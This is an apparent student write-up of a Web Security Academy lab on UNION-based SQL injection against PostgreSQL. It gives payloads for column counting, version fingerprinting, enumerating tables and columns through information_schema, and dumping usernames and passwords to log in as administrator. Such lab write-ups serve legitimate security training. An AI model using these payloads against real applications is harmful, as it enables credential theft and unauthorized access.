**SQL Injection -- Lab #9 SQL injection attack, listing the database contents on non Oracle databases**

<img width="1100" height="570" alt="image" src="https://github.com/user-attachments/assets/807d89c4-590f-424b-97a4-05a966db91b9" />

As per description of the Lab, product category is vulnerable to SQLi.

End goal of the lab is to login as **administrator**

Lets start the Lab

<img width="1100" height="591" alt="image" src="https://github.com/user-attachments/assets/0e41188f-bcf2-43cf-828f-7c894c1a3dea" />

As per Lab description Product Category is vulnerable to SQL injection attack.

<img width="1100" height="629" alt="image" src="https://github.com/user-attachments/assets/b5ea2a26-8a6a-4e6e-bfd5-c487b889d0df" />

Lets quickly validate

<img width="1030" height="324" alt="image" src="https://github.com/user-attachments/assets/395efcf1-2587-4be0-9146-6b60e5a14bfb" />

Let validate again

<img width="1100" height="529" alt="image" src="https://github.com/user-attachments/assets/a149fd57-2298-4f33-b3e0-bd666a2f66a0" />

We don't get any error. It means this application is vulnerable to SQLi

Now, for performing SQLi UNION attack, we need to know two things.

1. We need to know the number of column in a Table.
2. We need to know the data type of the columns.
   
**STEP 1>** Need to determine number of columns

Now we can take a guess that there are two columns. One for Title and one for articles.

<img width="1100" height="568" alt="image" src="https://github.com/user-attachments/assets/8ff12b84-a921-4c02-8e6e-58df38ad6c2b" />

Lets validate

***web-security-academy.net/filter?category=Accessories’ ORDER BY 1 --***

<img width="1100" height="772" alt="image" src="https://github.com/user-attachments/assets/1618ae66-802b-4e9a-8b82-fec4965ad1e4" />

We don’t get any error.

Lets check again

***web-security-academy.net/filter?category=Accessories’ ORDER BY 2 ---***

<img width="1100" height="651" alt="image" src="https://github.com/user-attachments/assets/da79a7d5-5273-4dbf-88d5-734e1aca5219" />

Again we don’t get any error.

Lets check again

***web-security-academy.net/filter?category=Accessories’ ORDER BY 3 --***

<img width="1100" height="309" alt="image" src="https://github.com/user-attachments/assets/2b0d8832-c68d-4d39-90fe-2b7cd35356e5" />

We got an error. It means the Table contains 2 columns.

**SETP 2>** We need to know the data type of the columns.

We can guess that these column contains Strings data type.

Lets validate

***web-security-academy.net/filter?category=Accessories’ UNION SELECT ‘a’ , NULL --***

<img width="1100" height="715" alt="image" src="https://github.com/user-attachments/assets/c9521dd9-f2d7-4c64-b725-714b8bb34afa" />

We dont get any error. Lets check for other column

***web-security-academy.net/filter?category=Accessories’ UNION SELECT NULL, ‘a’ --***

<img width="1100" height="657" alt="image" src="https://github.com/user-attachments/assets/92e549f9-db85-4f30-acd1-2af32f817d58" />

Again we dont get any error. It confirms that both columns have strings data type.

**STEP 3>** Now 1st we need to figure out they type of database running in background.

In the Cheat Sheet we can get the queries to determine the versions of different databases.

<img width="1051" height="303" alt="image" src="https://github.com/user-attachments/assets/fdb87793-e26d-4938-8fc2-ac5e7637cb9c" />

We understand that this is not Oracle Data base as we are not using SELECT DUAL query

Lets try Microsoft

payload will be following

***web-security-academy.net/filter?category=Accessories’ UNION SELECT @@version , NULL --***

<img width="1100" height="267" alt="image" src="https://github.com/user-attachments/assets/1d16eb84-c2c3-4e9d-a266-39884d51fc31" />

We got an error.

Lets try PostgreSQL

***web-security-academy.net/filter?category=Accessories’ UNION SELECT version(), NULL --***

<img width="1100" height="761" alt="image" src="https://github.com/user-attachments/assets/f63e830e-c809-41c3-9f8b-5da90e8f9c06" />

It worked and we got the version of the Database. So it confirms that PostgreSQL is running.

**STEP 4>** Output the list of Table names in the database.

Lets check on the Cheat Sheet and find the query to display Tables in PostgreSQL

<img width="1047" height="372" alt="image" src="https://github.com/user-attachments/assets/d2a5415c-8b42-4c35-bfbd-a63db04179a8" />

**information_schema.tables** >> It will allow us to get all the tables in the Database

***SELECT * FROM information_schema.tables***

Now we need two column names to use UNION query.

Lets google some available column names for PostgreSQL.

https://www.postgresql.org/docs/current/infoschema-columns.html

<img width="1100" height="680" alt="image" src="https://github.com/user-attachments/assets/ad1c9963-f1bc-48b5-991d-25a5b20e87ae" />

Lets create the Payload

***web-security-academy.net/filter?category=Accessories’ UNION SELECT table_name, NULL FROM information_schema.tables --***

<img width="1036" height="982" alt="image" src="https://github.com/user-attachments/assets/dc247344-f917-4800-810a-1223c558d798" />

We got all the Tables available in the Database

There is a table called **users_qrjdib**. It could contain username and passwords for the users.

**SETP 5>** Output the column names of the Table

Now we need to find which column in table users_qrjdib contain username and passwords.

***SELECT * FROM information_schema.columns WHERE table_name = ‘TABLE-NAME-HERE’*** >> We can use this query to find out.

Again we need two column names to use UNION query.

Lets google again

<img width="1100" height="722" alt="image" src="https://github.com/user-attachments/assets/7fadbf0c-8788-4ffe-84b4-1e2114bb2c68" />

Lets make the payload

***web-security-academy.net/filter?category=Accessories’ UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = ‘users_qrjdib’ --***

<img width="1100" height="795" alt="image" src="https://github.com/user-attachments/assets/7b9ff2ad-4990-4107-8f58-ed81f96dc119" />

So these are the columns that contain username name and pawword.

**STEP 6>** Output the usernames and passwords.

Now, we know the table name: **users_qrjdib**, we know the username column: **username_drfgoq** and password column: **password_lttajr**

Now we need to output the usernames and passwords.

Lets make the payload

***web-security-academy.net/filter?category=Accessories’ UNION SELECT username_drfgoq, password_lttajr FROM users_qrjdib --***

<img width="1096" height="837" alt="image" src="https://github.com/user-attachments/assets/b992c42e-9d57-4dbf-8259-7cdb3c1c4b5e" />

And we got the password for administrator.

Lets try to login

<img width="1100" height="413" alt="image" src="https://github.com/user-attachments/assets/fc8d243e-1e36-4393-85f2-ad4457fce12b" />

And Lab is solved !!
